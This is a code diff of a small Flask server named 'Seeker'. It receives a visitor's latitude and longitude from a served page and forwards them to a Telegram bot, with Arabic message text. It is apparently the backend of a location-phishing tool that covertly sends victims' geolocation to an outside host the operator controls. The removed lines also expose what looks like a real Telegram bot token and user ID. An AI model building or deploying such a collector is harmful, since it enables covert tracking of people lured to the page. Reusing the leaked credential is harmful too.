@@ -1,21 +1,21 @@
-from flask import Flask, request
-import requests
+from flask import Flask, request, send_file
+import requests, os
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8180824287:AAGIK9u6Mym29gwvp7teIEXfVxkgzWUMYGs"
-USER_ID = "93372553"
+TOKEN = os.environ.get("TG_TOKEN")
+CHAT_ID = os.environ.get("TG_CHAT_ID")
+TG_API = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 
 @app.route("/")
 def index():
-    return "Seeker is running!"
+    return send_file("index.html")
 
 @app.route("/location", methods=["POST"])
 def location():
     data = request.get_json()
     lat = data.get("latitude")
     lon = data.get("longitude")
-    message = f"📍 Location: {lat}, {lon}"
-    
-    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}")
-    return "Location sent!", 200
+    msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
+    requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
+    return {"status":"تم الاستلام"}
